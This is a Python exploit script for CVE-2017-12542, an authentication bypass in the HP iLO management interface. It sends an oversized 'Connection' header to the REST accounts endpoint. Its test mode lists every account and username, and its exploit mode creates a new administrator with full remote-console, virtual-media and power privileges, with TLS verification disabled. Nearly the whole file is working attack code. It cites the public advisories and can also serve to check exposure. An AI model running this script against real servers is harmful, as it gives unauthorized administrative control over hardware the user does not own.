#!/usr/bin/env python

"""
Exploit trigger was presented @reconbrx 2018

Vulnerability found and documented by synacktiv:
https://www.synacktiv.com/posts/exploit/rce-vulnerability-in-hp-ilo.html

Original advisory from HP:
https://support.hpe.com/hpsc/doc/public/display?docId=hpesbhf03769en_us

Other advisories for this CVE:
https://tools.cisco.com/security/center/viewAlert.x?alertId=54930
https://securitytracker.com/id/1039222

IMPORTANT: 
THIS EXPLOIT IS JUST FOR ONE OUT OF THE THREE VULNERABILITES COVERED BY CVE-2017-12542!!!
The two other vulns are critical as well, but only triggerable on the host itself.


"""

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import json
import urllib3

#all of the HP iLO interfaces run on HTTPS, but most of them are using self-signed SSL cert 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

exploit_trigger = {'Connection' : 'A'*29}
accounts_url = 'https://%s/rest/v1/AccountService/Accounts'



def test(ip):
	
	url = accounts_url % ip
	try:
		response = requests.get(url, headers = exploit_trigger, verify = False)
	except Exception as e:
		return False, 'Could not connect to target %s, Reason: %s' % (ip, str(e))

	try:
		data = json.loads(response.text)
	except Exception as e:
		return False, 'Target response not as exected!, Exception data: %s' % (str(e),)

	return True, data

def exploit(ip, username, password):
	Oem = {
		'Hp' : {
			'LoginName' : username,
			'Privileges': {
				'LoginPriv' : True,
				'RemoteConsolePriv': True,
				'UserConfigPriv' : True,
				'VirtualMediaPriv': True,
				'iLOConfigPriv':True,
				'VirtualPowerAndResetPriv':True,
			}
		}
	}
	body = {
		'UserName':username,
		'Password':password,
		'Oem':Oem
	}
	url = accounts_url % ip



	try:
		response = requests.post(url, json=body, headers = exploit_trigger, verify = False)
	except Exception as e:
		return False, 'Could not connect to target %s, Reason: %s' % (ip, str(e))

	if response.status_code in [requests.codes.ok, requests.codes.created]:
		return True, response.text
	else:
		return False, 'Server returned status code %d, data: %s' % (response.status_code, response.text)

if __name__ == '__main__':
	import argparse
	import sys
	parser = argparse.ArgumentParser(description='CVE-2017-12542 Tester and Exploiter script.')
	parser.add_argument('ip', help='target IP')
	parser.add_argument('-t', action='store_true', default=True, help='Test. Trigger the exploit and list all users')
	parser.add_argument('-e', action='store_true', default=False, help='Exploit. Create a new admin user with the credentials specified in -u and -p')
	parser.add_argument('-u', help='username of the new admin user')
	parser.add_argument('-p', help='password of the new admin user')

	args = parser.parse_args()

	if args.e:
		if args.u is None or args.p is None:
			print('Username and password must be set for exploiting!')
			sys.exit()
		res, data = exploit(args.ip, args.u, args.p)
		if res:
			print('[+] Sucsessfully added user!')
		else:
			print('[-] Error! %s' % data)

	elif args.t:
		res, data = test(args.ip)
		if res:
			print('[+] Target is VULNERABLE!')
			for i in data['Items']:
				print('[+] Account name: %s Username: %s' % (i['Name'], i['Oem']['Hp']['LoginName']))
		else:
			print('[-] Error! %s' % data)